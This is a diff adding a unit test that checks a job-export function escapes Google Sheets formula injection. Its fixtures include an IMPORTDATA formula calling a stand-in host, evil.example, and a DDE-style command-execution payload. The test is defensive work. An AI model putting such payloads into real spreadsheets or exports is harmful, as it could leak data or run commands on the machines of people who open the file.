@@ -90,4 +90,21 @@ describe('formatJobsForSheets', () => {
     expect(betaRow[9]).toBe('');
     expect(betaRow[11]).toBe('');
   });
+
+  it('neutralizes formula trigger characters to prevent Google Sheets formula injection', () => {
+    const rows = formatJobsForSheets([
+      {
+        ...sampleJobs[0],
+        company: '=IMPORTDATA("https://evil.example/leak")',
+        notes: '+cmd|"/C calc"!A0',
+        location: '-1+1',
+        team: '@SUM(1,2)',
+      },
+    ]);
+    const row = rows[1];
+    expect(row[0]).toBe('\'=IMPORTDATA("https://evil.example/leak")');
+    expect(row[2]).toBe("'@SUM(1,2)");
+    expect(row[6]).toBe("'-1+1");
+    expect(row[11]).toBe('\'+cmd|"/C calc"!A0');
+  });
 });
